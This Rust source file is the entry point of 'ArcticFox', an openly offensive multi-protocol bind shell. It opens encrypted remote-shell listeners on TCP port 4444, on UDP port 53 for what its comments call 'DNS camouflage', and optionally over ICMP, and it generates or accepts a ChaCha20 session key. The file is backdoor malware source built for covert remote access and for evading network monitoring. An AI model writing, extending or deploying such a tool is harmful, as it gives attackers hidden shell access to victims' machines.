//! ArcticFox Bind Shell — Multi-Protocol Entry Point

use clap::Parser;
use std::net::SocketAddr;
use tracing::info;
use tracing_subscriber::EnvFilter;

/// ArcticFox Multi-Protocol ZW-Encrypted Bind Shell
#[derive(Parser)]
#[command(name = "arcticfox-bindshell", version, about)]
struct Cli {
    /// Session key (64 hex chars = 32 bytes for ChaCha20-Poly1305)
    #[arg(short = 'k', long = "key")]
    key: Option<String>,

    /// TCP bind address
    #[arg(long, default_value = "0.0.0.0:4444")]
    tcp_addr: SocketAddr,

    /// UDP bind address (port 53 for DNS camouflage)
    #[arg(long, default_value = "0.0.0.0:53")]
    udp_addr: SocketAddr,

    /// Enable ICMP bind shell (requires root)
    #[arg(long)]
    icmp: bool,

    /// Idle timeout in seconds
    #[arg(long, default_value_t = 300)]
    idle_timeout: u64,
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::new("arcticfox_bindshell=info"))
        .init();

    let session_key = if let Some(hex_key) = &cli.key {
        let bytes = hex::decode(hex_key).expect("Invalid hex key — must be 64 hex chars");
        if bytes.len() != 32 {
            tracing::error!("Session key must be 32 bytes (64 hex chars), got {} bytes", bytes.len());
            std::process::exit(1);
        }
        let mut key = [0u8; 32];
        key.copy_from_slice(&bytes);
        key
    } else {
        let key = arcticfox_core::crypto::generate_session_key();
        info!("Generated session key: {}", hex::encode(key));
        key
    };

    info!("Starting multi-protocol ZW-encrypted bind shell");

    // TCP shell
    let tcp_key = session_key;
    let tcp_addr = cli.tcp_addr;
    let tcp_idle = cli.idle_timeout;
    let tcp_handle = tokio::spawn(async move {
        if let Err(e) = arcticfox_bindshell::tcp_bind::spawn_tcp_shell(tcp_addr, tcp_key, tcp_idle).await {
            tracing::error!("TCP shell error: {e}");
        }
    });

    // UDP/53 shell
    let udp_key = session_key;
    let udp_addr = cli.udp_addr;
    let udp_handle = tokio::spawn(async move {
        if let Err(e) = arcticfox_bindshell::udp_bind::spawn_udp_shell(udp_addr, udp_key).await {
            tracing::error!("UDP shell error: {e}");
        }
    });

    // ICMP shell (if enabled)
    let icmp_handle = if cli.icmp {
        let icmp_key = session_key;
        Some(tokio::spawn(async move {
            if let Err(e) = arcticfox_bindshell::icmp_bind::spawn_icmp_shell(icmp_key).await {
                tracing::error!("ICMP shell error: {e}");
            }
        }))
    } else {
        None
    };

    // Wait for any to finish
    tokio::select! {
        _ = tcp_handle => {},
        _ = udp_handle => {},
        _ = async { if let Some(h) = icmp_handle { h.await.ok(); } } => {},
    }
}
